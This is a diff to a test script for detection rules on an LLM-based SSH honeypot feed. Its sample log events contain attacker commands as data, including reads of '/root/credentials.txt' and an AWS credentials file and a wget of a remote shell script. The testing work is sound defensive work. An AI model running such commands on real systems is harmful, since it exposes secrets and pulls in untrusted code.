@@ -75,7 +75,9 @@ echo "== shelLM (LLM honeypot) feed =="
 check 100311 "shelLM session start (no tier)" '{"honeypot":"shelLM","event":"session_start","protocol":"SSH","srcip":"9.9.9.9","user":"root","tier":"NONE","persona":"Eman_v1","time":"2026-01-01T00:00:00Z"}'
 check 100312 "shelLM session start (SKILLED persona served)" '{"honeypot":"shelLM","event":"session_start","protocol":"SSH","srcip":"9.9.9.9","user":"root","tier":"SKILLED","persona":"Tier_skilled","time":"2026-01-01T00:00:00Z"}'
 check 100315 "shelLM recon command" '{"honeypot":"shelLM","event":"command","protocol":"SSH","srcip":"9.9.9.9","user":"root","tier":"NONE","persona":"Eman_v1","command":"whoami","time":"2026-01-01T00:00:00Z"}'
-check 100316 "shelLM credential access command" '{"honeypot":"shelLM","event":"command","protocol":"SSH","srcip":"9.9.9.9","user":"root","tier":"NONE","persona":"Eman_v1","command":"cat /root/credentials.txt","time":"2026-01-01T00:00:00Z"}'
+check 100322 "shelLM TRIPWIRE: reads a planted lure" '{"honeypot":"shelLM","event":"command","protocol":"SSH","srcip":"9.9.9.9","user":"root","tier":"SKILLED","persona":"Tier_skilled","command":"cat /root/credentials.txt","time":"2026-01-01T00:00:00Z"}'
+check 100316 "shelLM credential access (non-lure secret)" '{"honeypot":"shelLM","event":"command","protocol":"SSH","srcip":"9.9.9.9","user":"root","tier":"NONE","persona":"Eman_v1","command":"cat /home/julie/.aws/credentials","time":"2026-01-01T00:00:00Z"}'
+check 100317 "shelLM ingress: wget" '{"honeypot":"shelLM","event":"command","protocol":"SSH","srcip":"9.9.9.9","user":"root","tier":"NONE","persona":"Eman_v1","command":"wget http://10.0.0.9/x.sh","time":"2026-01-01T00:00:00Z"}'
 
 echo ""
 echo "passed: $pass   failed: $fail"
